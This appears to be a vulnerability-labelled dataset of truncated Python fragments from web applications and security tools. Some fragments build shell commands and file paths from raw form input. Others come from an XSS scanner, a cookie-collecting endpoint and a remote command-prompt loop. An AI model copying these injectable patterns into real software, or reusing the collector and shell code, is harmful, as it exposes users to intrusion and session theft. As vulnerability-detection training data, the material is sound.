=re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\", "label": 1}, {"snippet_id": 39879, "code": "(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname", "label": 0}, {"snippet_id": 9818, "code": "='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 9712, "code": ".views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url", "label": 0}, {"snippet_id": 14909, "code": "--no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self", "label": 0}, {"snippet_id": 10184, "code": " default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store", "label": 0}, {"snippet_id": 18235, "code": "/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index')", "label": 1}, {"snippet_id": 46345, "code": " get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name", "label": 0}, {"snippet_id": 10852, "code": ".clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils.check_services() if not self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize", "label": 0}, {"snippet_id": 31720, "code": "\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') ", "label": 0}, {"snippet_id": 31758, "code": ")+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form", "label": 0}, {"snippet_id": 37257, "code": "/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 15354, "code": " DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE", "label": 1}, {"snippet_id": 49396, "code": " self.query_params: selected_value=self.query_params[self.field_name] if type(selected_value)==list: selected_value=selected_value[0] if selected_value==self.value: return True elif self.value is None:", "label": 0}, {"snippet_id": 23847, "code": " test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 14476, "code": " urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if", "label": 0}, {"snippet_id": 45315, "code": ".can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc.update_data(coordinator_data) coordinator_doc.name=coordinator_data['name'] coordinator_doc.save() response['status'", "label": 0}, {"snippet_id": 54327, "code": "=pl) payload.current(0) global proxy proxy=ttk.Combobox(main, values=prox) global refresh refresh=ttk.Combobox(main, values=[\"On\", \"Off\"]) global crawl crawl=ttk.Combobox(main, values=[\"On\", \"Off\"]) target", "label": 0}, {"snippet_id": 25570, "code": " cartpos: The cart position the form should be for :param event: The event this belongs to \"\"\" cartpos=self.cartpos=kwargs.pop('cartpos', None) orderpos=self.orderpos=kwargs.pop('orderpos', None) pos=cartpos", "label": 0}, {"snippet_id": 37070, "code": ".published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t", "label": 0}, {"snippet_id": 50336, "code": " request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) return '\"\"' def mode_input", "label": 0}, {"snippet_id": 547, "code": " as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request", "label": 1}, {"snippet_id": 30596, "code": "(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if form.getvalue('viewlogs') is not None: \tviewlog=form.getvalue", "label": 0}, {"snippet_id": 13191, "code": " name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-", "label": 0}, {"snippet_id": 31605, "code": " y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv", "label": 0}, {"snippet_id": 38781, "code": "(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__", "label": 0}, {"snippet_id": 24054, "code": " num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color ", "label": 0}, {"snippet_id": 2920, "code": "=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request", "label": 0}, {"snippet_id": 46504, "code": ".get('format')=='json': collections=[] for collection in existing_hue_collections: massaged_collection=collection.to_dict() if request.GET.get('is_mobile'): massaged_collection['absoluteUrl']=reverse('search", "label": 0}, {"snippet_id": 34981, "code": " \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into `tab{doctype}` \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join", "label": 0}, {"snippet_id": 25743, "code": ", help_text=help_text, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea", "label": 0}, {"snippet_id": 44022, "code": " \t\t\t_filters[f]=fval \tfor d in data: \t\tadd=True \t\tfor f, fval in iteritems(_filters): \t\t\tif not frappe.compare(getattr(d, f, None), fval[0], fval[1]): \t\t\t\tadd=False \t\t\t\tbreak \t\tif add: \t\t\tout.append(d)", "label": 0}, {"snippet_id": 47454, "code": " due to: \" +str(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user", "label": 0}, {"snippet_id": 12059, "code": ".courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about", "label": 0}, {"snippet_id": 2088, "code": "{ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body", "label": 0}, {"snippet_id": 45964, "code": "[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\", \"id\":\"99923aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]},", "label": 0}, {"snippet_id": 54068, "code": " if len(pr)==0: pr=None if method.get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie", "label": 0}, {"snippet_id": 38988, "code": "._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: ", "label": 0}, {"snippet_id": 49841, "code": "'sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if __name__=='__main__': socketio.run(app,debug=True,host=HOST", "label": 0}, {"snippet_id": 41625, "code": ":param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document \tglobal _classes \tif not doctype in _classes: \t\tmodule_name, custom=frappe.db.get_value(\"DocType\", doctype,(\"module\"", "label": 0}, {"snippet_id": 46289, "code": "'start': 0} template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections", "label": 0}, {"snippet_id": 50261, "code": " request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request.getRequestHostname(), request.getHost().port) sess=AjaxWebClientSession(", "label": 1}, {"snippet_id": 8666, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns ", "label": 0}, {"snippet_id": 30020, "code": " enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div class=", "label": 0}, {"snippet_id": 48457, "code": "(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"\"\" u: Profile=get_current_user(request) forward_url=\"/admin?success", "label": 0}, {"snippet_id": 18497, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 3977, "code": "\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record", "label": 0}, {"snippet_id": 21112, "code": "<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license", "label": 0}, {"snippet_id": 45443, "code": ", kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping): try: wf_doc", "label": 0}, {"snippet_id": 11370, "code": ", self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test", "label": 0}, {"snippet_id": 30720, "code": "(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] ", "label": 0}, {"snippet_id": 21746, "code": "?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/", "label": 0}, {"snippet_id": 45032, "code": " reverse('oozie:editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt,", "label": 0}, {"snippet_id": 40732, "code": "\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t ", "label": 0}, {"snippet_id": 7849, "code": ".views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'", "label": 0}, {"snippet_id": 22914, "code": " name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>", "label": 0}, {"snippet_id": 48798, "code": " from typing import List from smart_lists.exceptions import SmartListException from smart_lists.filters import SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label", "label": 0}, {"snippet_id": 42188, "code": "[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d", "label": 0}, {"snippet_id": 29042, "code": "+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS", "label": 0}, {"snippet_id": 35602, "code": ".fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) ", "label": 0}, {"snippet_id": 49253, "code": "(TitleFromModelFieldMixin, object): def __init__(self, model, field, column_id, query_params, ordering_query_param, label=None, render_function=None): self.model=model self.field_name=field self.label=label", "label": 0}, {"snippet_id": 35946, "code": "\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t", "label": 0}, {"snippet_id": 48877, "code": ")==list: query[key]=value[0] query.update(new_query_dict) for key, value in query.copy().items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def", "label": 0}, {"snippet_id": 10539, "code": "{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self):", "label": 0}, {"snippet_id": 24461, "code": "('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self.extra_args=kwargs", "label": 1}, {"snippet_id": 12179, "code": ".index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook", "label": 1}, {"snippet_id": 10382, "code": " num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color", "label": 0}, {"snippet_id": 34244, "code": " BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\") \tdef __init__(self, d): \t\tself.update(d) \t\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__", "label": 0}, {"snippet_id": 3533, "code": " xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode", "label": 0}, {"snippet_id": 32410, "code": " a string(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors", "label": 0}, {"snippet_id": 22194, "code": ".views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$", "label": 0}, {"snippet_id": 26379, "code": " self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' ", "label": 0}, {"snippet_id": 8553, "code": ", url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name", "label": 0}, {"snippet_id": 52327, "code": " mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1} workflow=json.loads(request.POST.get('workflow', '{}')) layout=json.loads(request.POST.get", "label": 0}, {"snippet_id": 11303, "code": "'pa11ycrawler_reports') self.tar_gz_file=\"https://github.com/edx/demo-test-course/archive/master.tar.gz\" self.start_urls=[] auto_auth_params={ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key", "label": 0}, {"snippet_id": 21942, "code": "-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds", "label": 0}, {"snippet_id": 47957, "code": " django.shortcuts import redirect from django.http import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown", "label": 0}, {"snippet_id": 33497, "code": " strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route", "label": 1}, {"snippet_id": 48814, "code": " def get_title(self): if self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title() elif self.field_name=='__str__': return self.model._meta.verbose_name.title() try", "label": 0}, {"snippet_id": 31772, "code": ": \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\"", "label": 0}, {"snippet_id": 43621, "code": " self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent\"): \t\t\t\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn", "label": 0}, {"snippet_id": 24065, "code": ") suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_invalid_verbosity_and_processes(self):", "label": 0}, {"snippet_id": 52223, "code": "> 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise", "label": 0}, {"snippet_id": 19660, "code": " zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call(", "label": 0}, {"snippet_id": 27333, "code": " webapp2 from base import utils from config import db_config from config import local_config from datastore import ndb from google_cloud_utils import storage from libs import auth from libs import form from", "label": 0}, {"snippet_id": 9159, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]", "label": 1}, {"snippet_id": 13872, "code": ".views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 40823, "code": "\tfor df in self.meta.get(\"fields\",{\"fieldtype\":('=', \"Text Editor\")}): \t\t\t\textract_images_from_doc(self, df.fieldname) def _filter(data, filters, limit=None): \t\"\"\"pass filters as: \t\t{\"key\": \"val\", \"key\":", "label": 0}, {"snippet_id": 20397, "code": ".should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir, 'pa11ycrawler_reports'", "label": 0}, {"snippet_id": 48538, "code": " the required response. \"\"\" js_string: str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET", "label": 0}, {"snippet_id": 14448, "code": " settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=", "label": 0}, {"snippet_id": 48808, "code": " SmartListFilter class TitleFromModelFieldMixin(object): def get_title(self): if self.label: return self.label elif self.model_field: return self.model_field.verbose_name.title() elif self.field_name==", "label": 0}, {"snippet_id": 54293, "code": "=[\"GET & POST\", \"GET\", \"POST\"]) global timeout timeout=ttk.Combobox(main, values=range(1,61)) timeout.current(14) global user_agent user_agent=ttk.Combobox(main, values=ua) user_agent.current(1) global", "label": 0}, {"snippet_id": 51954, "code": "=10000 STATICFILES_FINDERS=( 'django.contrib.staticfiles.finders.FileSystemFinder', 'django.contrib.staticfiles.finders.AppDirectoriesFinder', 'compressor.finders.CompressorFinder', ) COMPRESS_CSS_FILTERS=", "label": 0}, {"snippet_id": 49891, "code": " bitcoin_address}}\", \"donate to us via paypal at:{{ paypal_address}}\", \"donate to us via venmo at:{{ venmo_address}}\", \"donate to us via beemit at:{{ beemit_address}}\", ] return render_template(\"chatbot.html\", msg", "label": 1}, {"snippet_id": 2133, "code": " uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url=='': parsed_url=url for payload in xss_payloads: xss_request_url", "label": 0}, {"snippet_id": 23980, "code": " ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using", "label": 0}, {"snippet_id": 51258, "code": " UserAdmin) admin.site.unregister(Group) admin.site.register(Group, GroupAdmin) class CustomConfigForm(ConstanceForm): def __init__(self, *args, **kwargs): super(CustomConfigForm, self).__init__(*args, *", "label": 0}, {"snippet_id": 3938, "code": "} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss", "label": 0}, {"snippet_id": 24842, "code": ": print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty", "label": 0}, {"snippet_id": 2009, "code": "(decoded_payload) !=-1: impact=\"Low\" print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", ", "label": 0}, {"snippet_id": 49901, "code": "/COMET web client consists of two components running on twisted and django. They are both a part of the Evennia website url tree(so the testing website might be located on http://localhost:4001/, whereas", "label": 0}, {"snippet_id": 36369, "code": "(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields", "label": 0}, {"snippet_id": 10235, "code": ".assertEqual(suite.cmd, self._expected_command(name=name, verify_xss=True)) def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite(''", "label": 1}, {"snippet_id": 25846, "code": " elif q.type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else", "label": 0}, {"snippet_id": 39100, "code": " convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields:", "label": 0}, {"snippet_id": 13013, "code": " from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover", "label": 0}, {"snippet_id": 32167, "code": ".DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute", "label": 0}, {"snippet_id": 51859, "code": " '%(message)s', 'datefmt': '%Y-%m-%d %H:%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console", "label": 0}, {"snippet_id": 4240, "code": ": result=True if vul_param=='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid", "label": 0}, {"snippet_id": 32639, "code": ", path): extensions=[ 'markdown.extensions.def_list', 'markdown.extensions.fenced_code', 'markdown.extensions.tables', 'markdown.extensions.toc', 'gitiles_autolink', 'gitiles_ext_blocks', 'gitiles_smart_quotes", "label": 0}, {"snippet_id": 31168, "code": " syn_flood=form.getvalue('syn_flood')) \t if form.getvalue('installwaf'): \tfunct.waf_install(form.getvalue('installwaf')) \t if form.getvalue('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue(", "label": 0}, {"snippet_id": 27897, "code": ".render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string", "label": 0}, {"snippet_id": 48604, "code": "=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) sr.save() print(request.POST) print(sr.notes) return HttpResponseRedirect(\"/admin/reservations/edit?rid=\" +str(int(request.GET[\"rid\"])) +\"&srid=\"", "label": 0}, {"snippet_id": 44650, "code": " response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=NODES[node['widgetType']].get_mandatory_fields() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows", "label": 0}, {"snippet_id": 45047, "code": " mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission(user, workflow, fs, jt, mapping) job_id=submission.run() return job_id except RestException, ex", "label": 0}, {"snippet_id": 53933, "code": "): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n---------------------------\\n'+cookie+'", "label": 0}, {"snippet_id": 1209, "code": " scanid=generate_hash() content=request.get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api", "label": 0}, {"snippet_id": 36592, "code": ".website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class", "label": 1}, {"snippet_id": 14643, "code": "-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard", "label": 0}, {"snippet_id": 28709, "code": "\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False ", "label": 0}, {"snippet_id": 1256, "code": " else: msg={\"status\": \"Failed\"} except: msg={\"status\": \"Failed\"} return jsonify(msg) @app.route('/scan/scanids/', methods=['GET']) def fetch_scanids(): scanids=[] records=db.scanids.find({}) if records:", "label": 0}, {"snippet_id": 8457, "code": ".conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or 